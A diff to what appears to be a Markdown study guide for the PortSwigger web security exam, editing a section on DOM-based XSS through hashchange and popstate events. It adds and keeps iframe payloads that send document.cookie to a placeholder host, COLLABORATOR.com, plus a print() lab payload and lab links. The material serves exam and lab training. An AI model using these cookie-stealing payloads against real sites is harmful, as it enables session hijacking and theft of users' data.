@@ -183,11 +183,26 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
 ```  
 
->Following iframe uses **hash** character to trigger the OnHashChange **'#'** XSS.  
+>Below iframe uses **hash** character at end of URL to trigger the **OnHashChange** XSS cookie stealer.  
   
 ```JavaScript
-<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+<iframe src="https://TARGET.net/#" onload="document.location='http://COLLABORATOR.com/?cookies='+document.cookie"></iframe>
 ```  
+
+>Note if the cookie is secure with **HttpOnly** flag set enabled, the cookie cannot be stolen using XSS.  
+
+>PortSwigger Lab payload perform print.  
+
+```JavaScript
+<iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```  
+
+>Note: Identify in below lab the vulnerable jquery 1.8.2 version used with the CSS selector to identify **hashchange**.  
+
+![Hashchange](images/hashchange.png)  
+
+[PortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)  
+
 
 [Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  
 
@@ -1412,7 +1427,7 @@ Youtube channels:
 
 ## Footnote
 
->The exam is designed to be challenging, it is not straight forward vulnerabilities, twisted challenges and even rabbit holes.  
+>This PortSwigger exam is designed to be challenging, it is not straight forward vulnerabilities, twisted challenges, mixed academy labs into single problem and even rabbit holes.  
 >**Perseverance:** Persistence in doing something despite difficulty or delay in achieving success.  
 >#TryHarder  
 
